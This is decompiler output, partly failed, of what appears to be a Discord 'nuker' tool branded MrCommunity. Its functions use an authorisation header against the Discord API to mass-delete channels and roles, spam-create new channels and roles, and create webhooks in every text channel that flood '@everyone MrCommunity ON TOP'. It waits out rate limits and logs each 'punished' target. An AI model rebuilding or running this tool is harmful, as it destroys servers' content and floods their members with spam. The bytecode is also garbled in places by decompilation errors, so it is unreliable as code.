              156  FORMAT_VALUE          0  ''
              158  LOAD_GLOBAL              Fore
              160  LOAD_ATTR                LIGHTBLACK_EX
              162  FORMAT_VALUE          0  ''
              164  LOAD_GLOBAL              colors
              166  LOAD_ATTR                gray
              168  FORMAT_VALUE          0  ''
              170  LOAD_STR                 '] '
              172  LOAD_GLOBAL              colors
              174  LOAD_ATTR                gray
              176  FORMAT_VALUE          0  ''
              178  LOAD_STR                 '['
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_GLOBAL              Fore
              188  LOAD_ATTR                LIGHTBLACK_EX
              190  FORMAT_VALUE          0  ''
              192  LOAD_STR                 'Client'
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                LIGHTBLACK_EX
              198  FORMAT_VALUE          0  ''
              200  LOAD_GLOBAL              colors
              202  LOAD_ATTR                gray
              204  FORMAT_VALUE          0  ''
              206  LOAD_STR                 '] '
              208  LOAD_GLOBAL              Fore
              210  LOAD_ATTR                LIGHTBLACK_EX
              212  FORMAT_VALUE          0  ''
              214  LOAD_STR                 ' punished channel delete '
              216  LOAD_GLOBAL              Fore
              218  LOAD_ATTR                LIGHTCYAN_EX
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 ' '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                GREEN
              228  FORMAT_VALUE          0  ''
              230  LOAD_FAST                'channel'
              232  LOAD_METHOD              strip
              234  CALL_METHOD_0         0  ''
              236  FORMAT_VALUE          0  ''
              238  BUILD_STRING_34      34 
              240  CALL_FUNCTION_1       1  ''
              242  POP_TOP          

 L. 260       244  JUMP_FORWARD        252  'to 252'
              246  JUMP_BACK             0  'to 0'

 L. 262       248  JUMP_FORWARD        252  'to 252'
              250  JUMP_BACK             0  'to 0'
            252_0  COME_FROM           248  '248'
            252_1  COME_FROM           244  '244'
            252_2  COME_FROM            78  '78'

Parse error at or near `<118>' instruction at offset 26

    def DeleteChannels--- This code section failed: ---
              0_0  COME_FROM           250  '250'
              0_1  COME_FROM           246  '246'
              0_2  COME_FROM            48  '48'

 L. 266         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/channels/'
                6  LOAD_FAST                'channel'
                8  FORMAT_VALUE          0  ''
               10  BUILD_STRING_2        2 
               12  LOAD_GLOBAL              headers
               14  LOAD_CONST               ('headers',)
               16  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               18  STORE_FAST               'r'

 L. 267        20  LOAD_STR                 'retry_after'
               22  LOAD_FAST                'r'
               24  LOAD_ATTR                text
               26  <118>                 0  ''
               28  POP_JUMP_IF_FALSE    50  'to 50'

 L. 268        30  LOAD_GLOBAL              time
               32  LOAD_METHOD              sleep
               34  LOAD_FAST                'r'
               36  LOAD_METHOD              json
               38  CALL_METHOD_0         0  ''
               40  LOAD_STR                 'retry_after'
               42  BINARY_SUBSCR    
               44  CALL_METHOD_1         1  ''
               46  POP_TOP          
               48  JUMP_BACK             0  'to 0'
             50_0  COME_FROM            28  '28'

 L. 270        50  LOAD_FAST                'r'
               52  LOAD_ATTR                status_code
               54  LOAD_CONST               200
               56  COMPARE_OP               ==
               58  POP_JUMP_IF_TRUE     80  'to 80'
               60  LOAD_FAST                'r'
               62  LOAD_ATTR                status_code
               64  LOAD_CONST               201
               66  COMPARE_OP               ==
               68  POP_JUMP_IF_TRUE     80  'to 80'
               70  LOAD_FAST                'r'
               72  LOAD_ATTR                status_code
               74  LOAD_CONST               204
               76  COMPARE_OP               ==
               78  POP_JUMP_IF_FALSE   252  'to 252'
             80_0  COME_FROM            68  '68'
             80_1  COME_FROM            58  '58'

 L. 271        80  LOAD_GLOBAL              print
               82  LOAD_GLOBAL              colors
               84  LOAD_ATTR                gray
               86  FORMAT_VALUE          0  ''
               88  LOAD_STR                 '['
               90  LOAD_GLOBAL              colors
               92  LOAD_ATTR                gray
               94  FORMAT_VALUE          0  ''
               96  LOAD_GLOBAL              Fore
               98  LOAD_ATTR                GREEN
              100  FORMAT_VALUE          0  ''
              102  LOAD_STR                 '√'
              104  LOAD_GLOBAL              Fore
              106  LOAD_ATTR                GREEN
              108  FORMAT_VALUE          0  ''
              110  LOAD_GLOBAL              colors
              112  LOAD_ATTR                gray
              114  FORMAT_VALUE          0  ''
              116  LOAD_STR                 ']'
              118  LOAD_GLOBAL              colors
              120  LOAD_ATTR                gray
              122  FORMAT_VALUE          0  ''
              124  LOAD_STR                 ' '
              126  LOAD_GLOBAL              Fore
              128  LOAD_ATTR                LIGHTBLACK_EX
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 '· '
              134  LOAD_GLOBAL              colors
              136  LOAD_ATTR                gray
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '['
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_GLOBAL              Fore
              150  LOAD_ATTR                LIGHTBLACK_EX
              152  FORMAT_VALUE          0  ''
              154  LOAD_GLOBAL              ok
              156  FORMAT_VALUE          0  ''
              158  LOAD_GLOBAL              Fore
              160  LOAD_ATTR                LIGHTBLACK_EX
              162  FORMAT_VALUE          0  ''
              164  LOAD_GLOBAL              colors
              166  LOAD_ATTR                gray
              168  FORMAT_VALUE          0  ''
              170  LOAD_STR                 '] '
              172  LOAD_GLOBAL              colors
              174  LOAD_ATTR                gray
              176  FORMAT_VALUE          0  ''
              178  LOAD_STR                 '['
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_GLOBAL              Fore
              188  LOAD_ATTR                LIGHTBLACK_EX
              190  FORMAT_VALUE          0  ''
              192  LOAD_STR                 'Client'
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                LIGHTBLACK_EX
              198  FORMAT_VALUE          0  ''
              200  LOAD_GLOBAL              colors
              202  LOAD_ATTR                gray
              204  FORMAT_VALUE          0  ''
              206  LOAD_STR                 '] '
              208  LOAD_GLOBAL              Fore
              210  LOAD_ATTR                LIGHTBLACK_EX
              212  FORMAT_VALUE          0  ''
              214  LOAD_STR                 ' punished client Created '
              216  LOAD_GLOBAL              Fore
              218  LOAD_ATTR                LIGHTCYAN_EX
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 ' '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                GREEN
              228  FORMAT_VALUE          0  ''
              230  LOAD_FAST                'channel'
              232  LOAD_METHOD              strip
              234  CALL_METHOD_0         0  ''
              236  FORMAT_VALUE          0  ''
              238  BUILD_STRING_34      34 
              240  CALL_FUNCTION_1       1  ''
              242  POP_TOP          

 L. 272       244  JUMP_FORWARD        252  'to 252'
              246  JUMP_BACK             0  'to 0'

 L. 274       248  JUMP_FORWARD        252  'to 252'
              250  JUMP_BACK             0  'to 0'
            252_0  COME_FROM           248  '248'
            252_1  COME_FROM           244  '244'
            252_2  COME_FROM            78  '78'

Parse error at or near `<118>' instruction at offset 26

    def DeleteRoles--- This code section failed: ---
              0_0  COME_FROM           262  '262'
              0_1  COME_FROM           256  '256'
              0_2  COME_FROM            54  '54'

 L. 278         0  LOAD_GLOBAL              requests
                2  LOAD_ATTR                delete
                4  LOAD_STR                 'https://discord.com/api/v8/guilds/'
                6  LOAD_FAST                'guild'
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 '/roles/'
               12  LOAD_FAST                'role'
               14  FORMAT_VALUE          0  ''
               16  BUILD_STRING_4        4 
               18  LOAD_GLOBAL              headers
               20  LOAD_CONST               ('headers',)
               22  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               24  STORE_FAST               'r'

 L. 279        26  LOAD_STR                 'retry_after'
               28  LOAD_FAST                'r'
               30  LOAD_ATTR                text
               32  <118>                 0  ''
               34  POP_JUMP_IF_FALSE    56  'to 56'

 L. 280        36  LOAD_GLOBAL              time
               38  LOAD_METHOD              sleep
               40  LOAD_FAST                'r'
               42  LOAD_METHOD              json
               44  CALL_METHOD_0         0  ''
               46  LOAD_STR                 'retry_after'
               48  BINARY_SUBSCR    
               50  CALL_METHOD_1         1  ''
               52  POP_TOP          
               54  JUMP_BACK             0  'to 0'
             56_0  COME_FROM            34  '34'

 L. 282        56  LOAD_FAST                'r'
               58  LOAD_ATTR                status_code
               60  LOAD_CONST               200
               62  COMPARE_OP               ==
               64  POP_JUMP_IF_TRUE     88  'to 88'
               66  LOAD_FAST                'r'
               68  LOAD_ATTR                status_code
               70  LOAD_CONST               201
               72  COMPARE_OP               ==
               74  POP_JUMP_IF_TRUE     88  'to 88'
               76  LOAD_FAST                'r'
               78  LOAD_ATTR                status_code
               80  LOAD_CONST               204
               82  COMPARE_OP               ==
            84_86  POP_JUMP_IF_FALSE   264  'to 264'
             88_0  COME_FROM            74  '74'
             88_1  COME_FROM            64  '64'

 L. 283        88  LOAD_GLOBAL              print
               90  LOAD_GLOBAL              colors
               92  LOAD_ATTR                gray
               94  FORMAT_VALUE          0  ''
               96  LOAD_STR                 '['
               98  LOAD_GLOBAL              colors
              100  LOAD_ATTR                gray
              102  FORMAT_VALUE          0  ''
              104  LOAD_GLOBAL              Fore
              106  LOAD_ATTR                GREEN
              108  FORMAT_VALUE          0  ''
              110  LOAD_STR                 '√'
              112  LOAD_GLOBAL              Fore
              114  LOAD_ATTR                GREEN
              116  FORMAT_VALUE          0  ''
              118  LOAD_GLOBAL              colors
              120  LOAD_ATTR                gray
              122  FORMAT_VALUE          0  ''
              124  LOAD_STR                 ']'
              126  LOAD_GLOBAL              colors
              128  LOAD_ATTR                gray
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 ' '
              134  LOAD_GLOBAL              Fore
              136  LOAD_ATTR                LIGHTBLACK_EX
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 '· '
              142  LOAD_GLOBAL              colors
              144  LOAD_ATTR                gray
              146  FORMAT_VALUE          0  ''
              148  LOAD_STR                 '['
              150  LOAD_GLOBAL              colors
              152  LOAD_ATTR                gray
              154  FORMAT_VALUE          0  ''
              156  LOAD_GLOBAL              Fore
              158  LOAD_ATTR                LIGHTBLACK_EX
              160  FORMAT_VALUE          0  ''
              162  LOAD_GLOBAL              ok
              164  FORMAT_VALUE          0  ''
              166  LOAD_GLOBAL              Fore
              168  LOAD_ATTR                LIGHTBLACK_EX
              170  FORMAT_VALUE          0  ''
              172  LOAD_GLOBAL              colors
              174  LOAD_ATTR                gray
              176  FORMAT_VALUE          0  ''
              178  LOAD_STR                 '] '
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '['
              188  LOAD_GLOBAL              colors
              190  LOAD_ATTR                gray
              192  FORMAT_VALUE          0  ''
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                LIGHTBLACK_EX
              198  FORMAT_VALUE          0  ''
              200  LOAD_STR                 'Client'
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                LIGHTBLACK_EX
              206  FORMAT_VALUE          0  ''
              208  LOAD_GLOBAL              colors
              210  LOAD_ATTR                gray
              212  FORMAT_VALUE          0  ''
              214  LOAD_STR                 '] '
              216  LOAD_GLOBAL              Fore
              218  LOAD_ATTR                LIGHTBLACK_EX
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 ' punished client Created '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                LIGHTCYAN_EX
              228  FORMAT_VALUE          0  ''
              230  LOAD_STR                 ' '
              232  LOAD_GLOBAL              Fore
              234  LOAD_ATTR                GREEN
              236  FORMAT_VALUE          0  ''
              238  LOAD_FAST                'role'
              240  LOAD_METHOD              strip
              242  CALL_METHOD_0         0  ''
              244  FORMAT_VALUE          0  ''
              246  BUILD_STRING_34      34 
              248  CALL_FUNCTION_1       1  ''
              250  POP_TOP          

 L. 284   252_254  JUMP_FORWARD        264  'to 264'
              256  JUMP_BACK             0  'to 0'

 L. 286   258_260  JUMP_FORWARD        264  'to 264'
              262  JUMP_BACK             0  'to 0'
            264_0  COME_FROM           258  '258'
            264_1  COME_FROM           252  '252'
            264_2  COME_FROM            84  '84'

Parse error at or near `<118>' instruction at offset 32

    def SpamChannels--- This code section failed: ---
              0_0  COME_FROM           266  '266'
              0_1  COME_FROM           260  '260'
              0_2  COME_FROM            62  '62'

 L. 290         0  LOAD_FAST                'name'
                2  LOAD_CONST               0
                4  LOAD_CONST               ('name', 'type')
                6  BUILD_CONST_KEY_MAP_2     2 
                8  STORE_FAST               'json'

 L. 291        10  LOAD_GLOBAL              requests
               12  LOAD_ATTR                post
               14  LOAD_STR                 'https://discord.com/api/v8/guilds/'
               16  LOAD_FAST                'guild'
               18  FORMAT_VALUE          0  ''
               20  LOAD_STR                 '/channels'
               22  BUILD_STRING_3        3 
               24  LOAD_GLOBAL              headers
               26  LOAD_FAST                'json'
               28  LOAD_CONST               ('headers', 'json')
               30  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               32  STORE_FAST               'r'

 L. 292        34  LOAD_STR                 'retry_after'
               36  LOAD_FAST                'r'
               38  LOAD_ATTR                text
               40  <118>                 0  ''
               42  POP_JUMP_IF_FALSE    64  'to 64'

 L. 293        44  LOAD_GLOBAL              time
               46  LOAD_METHOD              sleep
               48  LOAD_FAST                'r'
               50  LOAD_METHOD              json
               52  CALL_METHOD_0         0  ''
               54  LOAD_STR                 'retry_after'
               56  BINARY_SUBSCR    
               58  CALL_METHOD_1         1  ''
               60  POP_TOP          
               62  JUMP_BACK             0  'to 0'
             64_0  COME_FROM            42  '42'

 L. 295        64  LOAD_FAST                'r'
               66  LOAD_ATTR                status_code
               68  LOAD_CONST               200
               70  COMPARE_OP               ==
               72  POP_JUMP_IF_TRUE     96  'to 96'
               74  LOAD_FAST                'r'
               76  LOAD_ATTR                status_code
               78  LOAD_CONST               201
               80  COMPARE_OP               ==
               82  POP_JUMP_IF_TRUE     96  'to 96'
               84  LOAD_FAST                'r'
               86  LOAD_ATTR                status_code
               88  LOAD_CONST               204
               90  COMPARE_OP               ==
            92_94  POP_JUMP_IF_FALSE   268  'to 268'
             96_0  COME_FROM            82  '82'
             96_1  COME_FROM            72  '72'

 L. 296        96  LOAD_GLOBAL              print
               98  LOAD_GLOBAL              colors
              100  LOAD_ATTR                gray
              102  FORMAT_VALUE          0  ''
              104  LOAD_STR                 '['
              106  LOAD_GLOBAL              colors
              108  LOAD_ATTR                gray
              110  FORMAT_VALUE          0  ''
              112  LOAD_GLOBAL              Fore
              114  LOAD_ATTR                GREEN
              116  FORMAT_VALUE          0  ''
              118  LOAD_STR                 '√'
              120  LOAD_GLOBAL              Fore
              122  LOAD_ATTR                GREEN
              124  FORMAT_VALUE          0  ''
              126  LOAD_GLOBAL              colors
              128  LOAD_ATTR                gray
              130  FORMAT_VALUE          0  ''
              132  LOAD_STR                 ']'
              134  LOAD_GLOBAL              colors
              136  LOAD_ATTR                gray
              138  FORMAT_VALUE          0  ''
              140  LOAD_STR                 ' '
              142  LOAD_GLOBAL              Fore
              144  LOAD_ATTR                LIGHTBLACK_EX
              146  FORMAT_VALUE          0  ''
              148  LOAD_STR                 '· '
              150  LOAD_GLOBAL              colors
              152  LOAD_ATTR                gray
              154  FORMAT_VALUE          0  ''
              156  LOAD_STR                 '['
              158  LOAD_GLOBAL              colors
              160  LOAD_ATTR                gray
              162  FORMAT_VALUE          0  ''
              164  LOAD_GLOBAL              Fore
              166  LOAD_ATTR                LIGHTBLACK_EX
              168  FORMAT_VALUE          0  ''
              170  LOAD_GLOBAL              ok
              172  FORMAT_VALUE          0  ''
              174  LOAD_GLOBAL              Fore
              176  LOAD_ATTR                LIGHTBLACK_EX
              178  FORMAT_VALUE          0  ''
              180  LOAD_GLOBAL              colors
              182  LOAD_ATTR                gray
              184  FORMAT_VALUE          0  ''
              186  LOAD_STR                 '] '
              188  LOAD_GLOBAL              colors
              190  LOAD_ATTR                gray
              192  FORMAT_VALUE          0  ''
              194  LOAD_STR                 '['
              196  LOAD_GLOBAL              colors
              198  LOAD_ATTR                gray
              200  FORMAT_VALUE          0  ''
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                LIGHTBLACK_EX
              206  FORMAT_VALUE          0  ''
              208  LOAD_STR                 'Client'
              210  LOAD_GLOBAL              Fore
              212  LOAD_ATTR                LIGHTBLACK_EX
              214  FORMAT_VALUE          0  ''
              216  LOAD_GLOBAL              colors
              218  LOAD_ATTR                gray
              220  FORMAT_VALUE          0  ''
              222  LOAD_STR                 '] '
              224  LOAD_GLOBAL              Fore
              226  LOAD_ATTR                LIGHTBLACK_EX
              228  FORMAT_VALUE          0  ''
              230  LOAD_STR                 ' punished client Created '
              232  LOAD_GLOBAL              Fore
              234  LOAD_ATTR                LIGHTCYAN_EX
              236  FORMAT_VALUE          0  ''
              238  LOAD_STR                 ' '
              240  LOAD_GLOBAL              Fore
              242  LOAD_ATTR                GREEN
              244  FORMAT_VALUE          0  ''
              246  LOAD_FAST                'name'
              248  FORMAT_VALUE          0  ''
              250  BUILD_STRING_34      34 
              252  CALL_FUNCTION_1       1  ''
              254  POP_TOP          

 L. 297   256_258  JUMP_FORWARD        268  'to 268'
              260  JUMP_BACK             0  'to 0'

 L. 299   262_264  JUMP_FORWARD        268  'to 268'
              266  JUMP_BACK             0  'to 0'
            268_0  COME_FROM           262  '262'
            268_1  COME_FROM           256  '256'
            268_2  COME_FROM            92  '92'

Parse error at or near `<118>' instruction at offset 40

    def SpamRoles--- This code section failed: ---
              0_0  COME_FROM           266  '266'
              0_1  COME_FROM           260  '260'
              0_2  COME_FROM            60  '60'

 L. 303         0  LOAD_STR                 'name'
                2  LOAD_FAST                'name'
                4  BUILD_MAP_1           1 
                6  STORE_FAST               'json'

 L. 304         8  LOAD_GLOBAL              requests
               10  LOAD_ATTR                post
               12  LOAD_STR                 'https://discord.com/api/v8/guilds/'
               14  LOAD_FAST                'guild'
               16  FORMAT_VALUE          0  ''
               18  LOAD_STR                 '/roles'
               20  BUILD_STRING_3        3 
               22  LOAD_GLOBAL              headers
               24  LOAD_FAST                'json'
               26  LOAD_CONST               ('headers', 'json')
               28  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               30  STORE_FAST               'r'

 L. 305        32  LOAD_STR                 'retry_after'
               34  LOAD_FAST                'r'
               36  LOAD_ATTR                text
               38  <118>                 0  ''
               40  POP_JUMP_IF_FALSE    62  'to 62'

 L. 306        42  LOAD_GLOBAL              time
               44  LOAD_METHOD              sleep
               46  LOAD_FAST                'r'
               48  LOAD_METHOD              json
               50  CALL_METHOD_0         0  ''
               52  LOAD_STR                 'retry_after'
               54  BINARY_SUBSCR    
               56  CALL_METHOD_1         1  ''
               58  POP_TOP          
               60  JUMP_BACK             0  'to 0'
             62_0  COME_FROM            40  '40'

 L. 308        62  LOAD_FAST                'r'
               64  LOAD_ATTR                status_code
               66  LOAD_CONST               200
               68  COMPARE_OP               ==
               70  POP_JUMP_IF_TRUE     94  'to 94'
               72  LOAD_FAST                'r'
               74  LOAD_ATTR                status_code
               76  LOAD_CONST               201
               78  COMPARE_OP               ==
               80  POP_JUMP_IF_TRUE     94  'to 94'
               82  LOAD_FAST                'r'
               84  LOAD_ATTR                status_code
               86  LOAD_CONST               204
               88  COMPARE_OP               ==
            90_92  POP_JUMP_IF_FALSE   268  'to 268'
             94_0  COME_FROM            80  '80'
             94_1  COME_FROM            70  '70'

 L. 309        94  LOAD_GLOBAL              print
               96  LOAD_GLOBAL              colors
               98  LOAD_ATTR                gray
              100  FORMAT_VALUE          0  ''
              102  LOAD_STR                 '['
              104  LOAD_GLOBAL              colors
              106  LOAD_ATTR                gray
              108  FORMAT_VALUE          0  ''
              110  LOAD_GLOBAL              Fore
              112  LOAD_ATTR                GREEN
              114  FORMAT_VALUE          0  ''
              116  LOAD_STR                 '√'
              118  LOAD_GLOBAL              Fore
              120  LOAD_ATTR                GREEN
              122  FORMAT_VALUE          0  ''
              124  LOAD_GLOBAL              colors
              126  LOAD_ATTR                gray
              128  FORMAT_VALUE          0  ''
              130  LOAD_STR                 ']'
              132  LOAD_GLOBAL              colors
              134  LOAD_ATTR                gray
              136  FORMAT_VALUE          0  ''
              138  LOAD_STR                 ' '
              140  LOAD_GLOBAL              Fore
              142  LOAD_ATTR                LIGHTBLACK_EX
              144  FORMAT_VALUE          0  ''
              146  LOAD_STR                 '· '
              148  LOAD_GLOBAL              colors
              150  LOAD_ATTR                gray
              152  FORMAT_VALUE          0  ''
              154  LOAD_STR                 '['
              156  LOAD_GLOBAL              colors
              158  LOAD_ATTR                gray
              160  FORMAT_VALUE          0  ''
              162  LOAD_GLOBAL              Fore
              164  LOAD_ATTR                LIGHTBLACK_EX
              166  FORMAT_VALUE          0  ''
              168  LOAD_GLOBAL              ok
              170  FORMAT_VALUE          0  ''
              172  LOAD_GLOBAL              Fore
              174  LOAD_ATTR                LIGHTBLACK_EX
              176  FORMAT_VALUE          0  ''
              178  LOAD_GLOBAL              colors
              180  LOAD_ATTR                gray
              182  FORMAT_VALUE          0  ''
              184  LOAD_STR                 '] '
              186  LOAD_GLOBAL              colors
              188  LOAD_ATTR                gray
              190  FORMAT_VALUE          0  ''
              192  LOAD_STR                 '['
              194  LOAD_GLOBAL              colors
              196  LOAD_ATTR                gray
              198  FORMAT_VALUE          0  ''
              200  LOAD_GLOBAL              Fore
              202  LOAD_ATTR                LIGHTBLACK_EX
              204  FORMAT_VALUE          0  ''
              206  LOAD_STR                 'Client'
              208  LOAD_GLOBAL              Fore
              210  LOAD_ATTR                LIGHTBLACK_EX
              212  FORMAT_VALUE          0  ''
              214  LOAD_GLOBAL              colors
              216  LOAD_ATTR                gray
              218  FORMAT_VALUE          0  ''
              220  LOAD_STR                 '] '
              222  LOAD_GLOBAL              Fore
              224  LOAD_ATTR                LIGHTBLACK_EX
              226  FORMAT_VALUE          0  ''
              228  LOAD_STR                 ' punished client Created '
              230  LOAD_GLOBAL              Fore
              232  LOAD_ATTR                LIGHTCYAN_EX
              234  FORMAT_VALUE          0  ''
              236  LOAD_STR                 ' '
              238  LOAD_GLOBAL              Fore
              240  LOAD_ATTR                GREEN
              242  FORMAT_VALUE          0  ''
              244  LOAD_STR                 ' '
              246  LOAD_FAST                'name'
              248  FORMAT_VALUE          0  ''
              250  BUILD_STRING_35      35 
              252  CALL_FUNCTION_1       1  ''
              254  POP_TOP          

 L. 310   256_258  JUMP_FORWARD        268  'to 268'
              260  JUMP_BACK             0  'to 0'

 L. 312   262_264  JUMP_FORWARD        268  'to 268'
              266  JUMP_BACK             0  'to 0'
            268_0  COME_FROM           262  '262'
            268_1  COME_FROM           256  '256'
            268_2  COME_FROM            90  '90'

Parse error at or near `<118>' instruction at offset 38

    def WebhookSend--- This code section failed: ---
              0_0  COME_FROM           272  '272'
              0_1  COME_FROM           266  '266'
              0_2  COME_FROM            84  '84'

 L. 317         0  LOAD_FAST                'message'
                2  LOAD_STR                 ''
                4  COMPARE_OP               !=
                6  POP_JUMP_IF_FALSE    12  'to 12'
                8  LOAD_FAST                'message'
               10  JUMP_FORWARD         14  'to 14'
             12_0  COME_FROM             6  '6'
               12  LOAD_STR                 '@everyone MrCommunity ON TOP'
             14_0  COME_FROM            10  '10'

 L. 318        14  LOAD_CONST               False

 L. 319        16  LOAD_STR                 'MrCommunity'

 L. 316        18  LOAD_CONST               ('content', 'tts', 'username')
               20  BUILD_CONST_KEY_MAP_3     3 
               22  STORE_FAST               'json'

 L. 321        24  LOAD_GLOBAL              requests
               26  LOAD_ATTR                post
               28  LOAD_FAST                'webhook'
               30  FORMAT_VALUE          0  ''
               32  LOAD_FAST                'json'
               34  LOAD_CONST               ('json',)
               36  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               38  STORE_FAST               'r'

 L. 322        40  LOAD_FAST                'r'
               42  LOAD_ATTR                status_code
               44  LOAD_CONST               429
               46  COMPARE_OP               ==
               48  POP_JUMP_IF_FALSE    86  'to 86'

 L. 323        50  LOAD_GLOBAL              time
               52  LOAD_METHOD              sleep
               54  LOAD_FAST                'r'
               56  LOAD_METHOD              json
               58  CALL_METHOD_0         0  ''
               60  LOAD_STR                 'retry_after'
               62  BINARY_SUBSCR    
               64  CALL_METHOD_1         1  ''
               66  POP_TOP          

 L. 324        68  LOAD_FAST                'self'
               70  LOAD_METHOD              WebhookSend
               72  LOAD_FAST                'webhook'
               74  LOAD_FAST                'message'
               76  CALL_METHOD_2         2  ''
               78  POP_TOP          

 L. 325     80_82  JUMP_FORWARD        274  'to 274'
               84  JUMP_BACK             0  'to 0'
             86_0  COME_FROM            48  '48'

 L. 327        86  LOAD_FAST                'r'
               88  LOAD_ATTR                status_code
               90  LOAD_CONST               204
               92  COMPARE_OP               ==
               94  POP_JUMP_IF_TRUE    100  'to 100'
               96  LOAD_CONST               201
               98  POP_JUMP_IF_TRUE    100  'to 100'
            100_0  COME_FROM            98  '98'
            100_1  COME_FROM            94  '94'

 L. 328       100  LOAD_GLOBAL              print
              102  LOAD_GLOBAL              colors
              104  LOAD_ATTR                gray
              106  FORMAT_VALUE          0  ''
              108  LOAD_STR                 '['
              110  LOAD_GLOBAL              colors
              112  LOAD_ATTR                gray
              114  FORMAT_VALUE          0  ''
              116  LOAD_GLOBAL              Fore
              118  LOAD_ATTR                GREEN
              120  FORMAT_VALUE          0  ''
              122  LOAD_STR                 '√'
              124  LOAD_GLOBAL              Fore
              126  LOAD_ATTR                GREEN
              128  FORMAT_VALUE          0  ''
              130  LOAD_GLOBAL              colors
              132  LOAD_ATTR                gray
              134  FORMAT_VALUE          0  ''
              136  LOAD_STR                 ']'
              138  LOAD_GLOBAL              colors
              140  LOAD_ATTR                gray
              142  FORMAT_VALUE          0  ''
              144  LOAD_STR                 ' '
              146  LOAD_GLOBAL              Fore
              148  LOAD_ATTR                LIGHTBLACK_EX
              150  FORMAT_VALUE          0  ''
              152  LOAD_STR                 '· '
              154  LOAD_GLOBAL              colors
              156  LOAD_ATTR                gray
              158  FORMAT_VALUE          0  ''
              160  LOAD_STR                 '['
              162  LOAD_GLOBAL              colors
              164  LOAD_ATTR                gray
              166  FORMAT_VALUE          0  ''
              168  LOAD_GLOBAL              Fore
              170  LOAD_ATTR                LIGHTBLACK_EX
              172  FORMAT_VALUE          0  ''
              174  LOAD_GLOBAL              ok
              176  FORMAT_VALUE          0  ''
              178  LOAD_GLOBAL              Fore
              180  LOAD_ATTR                LIGHTBLACK_EX
              182  FORMAT_VALUE          0  ''
              184  LOAD_GLOBAL              colors
              186  LOAD_ATTR                gray
              188  FORMAT_VALUE          0  ''
              190  LOAD_STR                 '] '
              192  LOAD_GLOBAL              colors
              194  LOAD_ATTR                gray
              196  FORMAT_VALUE          0  ''
              198  LOAD_STR                 '['
              200  LOAD_GLOBAL              colors
              202  LOAD_ATTR                gray
              204  FORMAT_VALUE          0  ''
              206  LOAD_GLOBAL              Fore
              208  LOAD_ATTR                LIGHTBLACK_EX
              210  FORMAT_VALUE          0  ''
              212  LOAD_STR                 'Client'
              214  LOAD_GLOBAL              Fore
              216  LOAD_ATTR                LIGHTBLACK_EX
              218  FORMAT_VALUE          0  ''
              220  LOAD_GLOBAL              colors
              222  LOAD_ATTR                gray
              224  FORMAT_VALUE          0  ''
              226  LOAD_STR                 '] '
              228  LOAD_GLOBAL              Fore
              230  LOAD_ATTR                LIGHTBLACK_EX
              232  FORMAT_VALUE          0  ''
              234  LOAD_STR                 ' punished client sent '
              236  LOAD_GLOBAL              Fore
              238  LOAD_ATTR                LIGHTCYAN_EX
              240  FORMAT_VALUE          0  ''
              242  LOAD_STR                 ' '
              244  LOAD_GLOBAL              Fore
              246  LOAD_ATTR                GREEN
              248  FORMAT_VALUE          0  ''
              250  LOAD_STR                 ' '
              252  LOAD_FAST                'message'
              254  FORMAT_VALUE          0  ''
              256  BUILD_STRING_35      35 
              258  CALL_FUNCTION_1       1  ''
              260  POP_TOP          

 L. 329   262_264  JUMP_FORWARD        274  'to 274'
              266  JUMP_BACK             0  'to 0'

 L. 331   268_270  JUMP_FORWARD        274  'to 274'
              272  JUMP_BACK             0  'to 0'
            274_0  COME_FROM           268  '268'
            274_1  COME_FROM           262  '262'
            274_2  COME_FROM            80  '80'

Parse error at or near `JUMP_FORWARD' instruction at offset 268_270

    async def SpamWebhook--- This code section failed: ---

 L. 335         0  LOAD_GLOBAL              client
                2  LOAD_METHOD              get_guild
                4  LOAD_GLOBAL              int
                6  LOAD_FAST                'guild_id'
                8  CALL_FUNCTION_1       1  ''
               10  CALL_METHOD_1         1  ''
               12  STORE_FAST               'guild'

 L. 336        14  BUILD_LIST_0          0 
               16  STORE_FAST               'web_urls'

 L. 337        18  LOAD_FAST                'guild'
               20  LOAD_ATTR                text_channels
               22  GET_ITER         
             24_0  COME_FROM           252  '252'
             24_1  COME_FROM           240  '240'
             24_2  COME_FROM           206  '206'
               24  FOR_ITER            254  'to 254'
               26  STORE_FAST               'channel'

 L. 338        28  SETUP_FINALLY       208  'to 208'

 L. 339        30  LOAD_FAST                'channel'
               32  LOAD_ATTR                create_webhook
               34  LOAD_STR                 'DISCORD.IO/MRTOOLS'
               36  LOAD_STR                 'MrCommunity'
               38  LOAD_CONST               ('name', 'reason')
               40  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               42  GET_AWAITABLE    
               44  LOAD_CONST               None
               46  YIELD_FROM       
               48  STORE_FAST               'webhook'

 L. 340        50  LOAD_GLOBAL              print
               52  LOAD_GLOBAL              colors
               54  LOAD_ATTR                gray
               56  FORMAT_VALUE          0  ''
               58  LOAD_STR                 '['
               60  LOAD_GLOBAL              colors
